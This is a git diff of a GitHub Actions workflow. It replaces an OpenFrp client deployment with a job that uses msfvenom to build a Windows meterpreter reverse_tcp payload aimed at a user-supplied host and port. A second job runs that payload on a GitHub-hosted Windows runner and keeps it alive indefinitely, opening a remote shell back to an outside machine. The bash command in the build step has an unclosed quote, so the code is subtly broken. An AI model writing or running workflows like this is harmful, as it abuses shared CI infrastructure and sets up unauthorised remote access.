@@ -1,25 +1,61 @@
-name: Deploy OpenFrp Client
+name: 牛逼666
 
 on:
-  workflow_dispatch: # 允许手动触发
+  workflow_dispatch:
+    inputs:
+      platform:
+        description: '选择目标平台'
+        required: true
+        default: 'windows'
+        type: choice
+        options:
+          - windows
+          - linux
+          - android
+      lhost:
+        description: '输入你的公网地址'
+        required: true
+        default: '192.168.1.100'
+      lport:
+        description: '输入监听端口'
+        required: true
+        default: '4444'
+      
+
 
 jobs:
-  deploy-frp:
-    runs-on: windows-latest # 必须使用 Windows Runner 以运行 .exe
-
+  build:
+    runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v3
-
-      - name: Download OpenFrp
+      - name: Generate Payload using Kali Docker
         run: |
-          $url = "https://staticassets.naids.com/client/OF_0.67.0_690979b2_260223/frpc_windows_amd64.zip"
-          
-          Invoke-WebRequest -Uri $url -OutFile "chmlfrp.zip"
-          
-          # 解压
-          Expand-Archive -Path "chmlfrp.zip" -DestinationPath "."
+          docker pull kalilinux/kali-rolling
 
-      - name: Start OpenFrp Client
+          # 运行容器并生成 Payload
+          docker run --rm \
+            -v "${PWD}:/output" \
+            -u root \
+            kalilinux/kali-rolling \
+            bash -c "apt-get update && \
+                     apt-get install -y metasploit-framework && \
+                     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -f exe -o reverse.exe 
+      
+      - name: Upload Payload
+        uses: actions/upload-artifact@v4
+        with:
+          name: gp
+          # 拼接路径和文件名
+          path: reverse.exe
+  cnct:
+    runs-on: windows-latest
+    needs: build
+    steps:
+      - name: dl
+        uses: actions/download-artifact@v7.0.0
+        with:
+          name: gp
+          path: g
+      - name: run
         run: |
-          .\frpc_windows_amd64 -u "${{ secrets.FRP_USER }}" -p "${{ secrets.FRP_TOKEN }}"
+          .\g\reverse.exe
+          timeout /t -1 /nobreak
